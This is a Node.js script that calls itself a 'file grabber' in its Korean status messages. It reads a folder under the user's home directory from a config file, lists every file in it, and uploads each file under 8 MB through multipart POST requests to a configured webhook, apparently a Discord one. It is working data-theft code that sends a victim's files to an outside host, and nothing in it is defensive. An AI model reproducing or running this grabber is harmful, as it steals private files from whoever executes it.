const request = require("request");
const url = require("url");
const fs = require("fs");
const glob = require("glob");
const path = require("path");
const Config = require("config.cf");
const os = require("os");
const { Readable } = require("stream");

const config = Config.parse(fs.readFileSync('config.cf', 'utf-8'));
const home = os.homedir();
const dir = config.file.target.replaceAll('[HOME]', home);
const wh = config.file.wh;

(async () => {
    const _files = await getFiles(dir);
    let files = [];
    let str = `파일을 가져올 폴더: ${dir}\n`;
    _files.forEach((file, i) => {
        if (!fs.lstatSync(file).isDirectory()) {
            files.push(file);
        }
    });
    files.forEach((file , i) => {
        if (fs.statSync(file).size / 1024 / 1024 < 8) {
            str += `**${file}** [장전 완료]\n`;
        } else {
            str += `**${file}** [파일 크기 초과]\n`;
            files.splice(i, 1);
        }
    });
    if (str.length > 5999) {
        let chunks = chunkSubstr(str, 1999);
        for await (var chunk of chunks) {
            await sendMessage({
                content: chunk
            });
            await sleep(900);
        }
    } else {
        await sendMessage({
            embeds: [{
                title: `파일 그래버 준비됨.`,
                description: str,
                color: 0x218fee
            }]
        });
    }
    for (var file of files) {
        await sendFile(file, {
            'content': file
        });
    }
})();

function sleep(ms) {
    return new Promise(async (resolve, reject) => {
        setTimeout(resolve, ms);
    });
}

function getFiles(p) {
    return new Promise(async (resolve, reject) => {
        glob(`${p}/**/*`, (err, files) => {
            if (err) return reject(err);
            resolve(files);
        });
    });
}

function sendMessage(msg) {
    return new Promise(async (resolve, reject) => {
        request(wh, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(msg)
        }, (err, res, body) => {
            if (err) return reject(err);
            resolve(body);
        });
    });
}

function sendFile(filePath, payload = {}, stream = false) {
    return new Promise(async (resolve, reject) => {
        let file = stream ? filePath : fs.createReadStream(filePath);
        let formData = {
            files: [],
            payload_json: JSON.stringify(payload)
        };
        formData.files.push(file);
        request(wh, {
            method: 'POST',
            headers: {
                'Content-Type': 'multipart/form-data'
            },
            formData: formData,
        }, (err, res, body) => {
            if (err) return reject(err);
            resolve(body);
        });
    });
}

function chunkSubstr(str, size) {
    const numChunks = Math.ceil(str.length / size);
    const chunks = new Array(numChunks);

    for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
        chunks[i] = str.substr(o, size);
    }

    return chunks;
}
